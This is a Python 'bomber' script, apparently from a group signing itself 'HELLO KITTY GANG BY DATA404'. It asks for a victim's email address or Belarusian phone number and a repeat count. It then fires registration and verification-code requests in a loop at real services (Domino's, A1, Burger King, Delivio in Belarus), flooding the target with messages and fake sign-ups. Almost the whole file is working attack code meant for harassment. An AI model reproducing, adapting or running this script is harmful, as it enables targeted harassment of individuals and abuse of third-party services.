import uuid
import functools
import requests
import asyncio
from termcolor import colored
from headers import *
from parsers import *

print(colored("""
    ´´´´´´´¶¶¶¶´´´´´´´´´´´´´´´´´´
´´´´´´¶¶´´´´¶¶¶¶¶´´¶¶¶¶´¶¶¶¶´´
´´´´´´¶´´´´´´´´´´¶¶¶¶´¶¶´´´´¶´
´´´´´´¶´´´´´´´´´´¶´¶¶¶¶¶¶´´´¶´
´´´´´¶´´´´´´´´´´¶¶¶¶¶´´´¶¶¶¶¶´
´´´´¶´´´´´´´´´´´´´´´´¶¶¶¶¶¶¶¶´
´´´¶´´´´´´´´´´´´´´´´´´´¶¶¶¶¶´´
´¶¶¶´´´´´¶´´´´´´´´´´´´´´´´´¶´´
´´´¶´´´´¶¶´´´´´´´´´´´´´´´´´¶´´
´´´¶¶´´´´´´´´´´´´´´´´¶¶´´´´¶´´
´´¶¶¶´´´´´´´´´¶¶¶´´´´¶¶´´´¶¶´´
´´´´´¶¶´´´´´´´´´´´´´´´´´´¶¶¶´´
´´´´´´´¶¶¶´´´´´´´´´´´´´¶¶¶´´´´
´´´¶¶¶¶¶´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´
´´´¶´´´´¶¶¶¶¶´´´´¶¶¶¶´´´¶´´´´´
´´´¶´´´´¶¶¶´¶¶¶¶¶¶¶¶´´´¶¶¶´´´´
´´´¶¶¶¶¶¶¶¶¶¶¶¶¶´´¶¶¶¶¶´´´¶¶´´
´´¶´´´´´´¶¶¶¶¶¶¶¶¶¶¶´´´´´´´¶´´
´¶´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´´¶´´
´´¶´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´´¶´´
´´¶¶´´´´´´´¶¶´´´´¶¶´´´´´´¶¶´´´
´´´´¶¶¶¶¶¶¶´´´´´´´´¶¶¶¶¶¶´´
´´´´´´´HELLO´´KITTY´´GANG´´´
´´´´´´´BY´´´DATA404´´´´´´´
""", "magenta"))


def output_status(response, provider):
    if response.status_code in (200, 201):
        print(colored(f"{provider} sent successful", "blue"))
    else:
        print(colored(f"{provider} Failure", "red"))


def update_data(email):
    dominos_data = "{{\"email\":\"{1}\", \"phone\":\"375293345467\",\"password\": \"{0}\"}}".format(
        str(uuid.uuid4()).replace('-', ''), email)
    return dominos_data


def make_bk_payload(phone):
    phone_parsed = parse_phone_bk(phone)
    payload = f'action=send_code&phone={phone_parsed}'
    return payload


async def email_bomber(email):
    loop = asyncio.get_event_loop()
    print(colored("Started Dominos", "blue"))
    dominos_data = update_data(email)
    feature_dominos = loop.run_in_executor(None, lambda: requests.request('POST',
                                                                          url='https://dominos.by/api/web/user/register?language=ru&cityId=2',
                                                                          headers=domios_headers, data=dominos_data))
    response_dominos = await feature_dominos
    output_status(response_dominos, "Dominos")


async def phone_bomber(phone):
    loop = asyncio.get_event_loop()
    print(colored("Started A1", "blue"))
    if phone[3:5] in ('29', '44'):
        phone_a1 = parse_phone_a1(phone)
        try:
            feature_a1 = loop.run_in_executor(None, lambda: requests.request("GET",
                                                                             url=f'https://asmp.a1.by/asmp/registration-sendpin?t=r&phone={phone_a1}&timer=0',
                                                                             headers=a1_headers, data={}))
            response_a1 = await feature_a1
            output_status(response_a1, "A1")
        except Exception as e:
            print(colored(e, "green"))
    else:
        print(colored("A1 skipped", "blue"))
    print(colored("Started Burger King", "blue"))
    payload_bk = make_bk_payload(phone)
    try:
        feature_bk = loop.run_in_executor(None,
                                          lambda: requests.request("POST",
                                                                   url='https://burger-king.by/local/ajax/auth.php',
                                                                   headers=burger_headers, data=payload_bk))
        response_bk = await feature_bk
        output_status(response_bk, "Burger King")
    except Exception as e:
        print(colored(e, "green"))
    print(colored("Started Dilivio", "blue"))
    payload_delivio = "{{\"phone\":\"+{0}\"}}".format(phone.replace('+', ''))
    try:
        feature_delivio = loop.run_in_executor(None,
                                               lambda: requests.request("POST",
                                                                        url='https://delivio.by/be/api/register',
                                                                        headers=delivio_headers, data=payload_delivio))
        response_delivio = await feature_delivio
        output_status(response_delivio, "Delivio")
    except Exception as e:
        print(colored(e, "green"))


if __name__ == '__main__':
    option = int(input(colored("Chose desirable option... [1] - Email bomber, [2] - phone bomber: \n", "blue")).strip())
    count = int(input(colored("How much iterations u want? ", "blue")))
    if option == 1:
        email = input(colored("Enter target email:", "yellow")).strip()
        loop = asyncio.get_event_loop()
        for i in range(count):
            loop.run_until_complete(email_bomber(email=email))
    elif option == 2:
        phone = input(colored("Enter target phone in format 375xxxxxxxxx:", "yellow")).strip()
        loop = asyncio.get_event_loop()
        for i in range(count):
            loop.run_until_complete(phone_bomber(phone=phone))
    print(colored("Async running", "yellow"))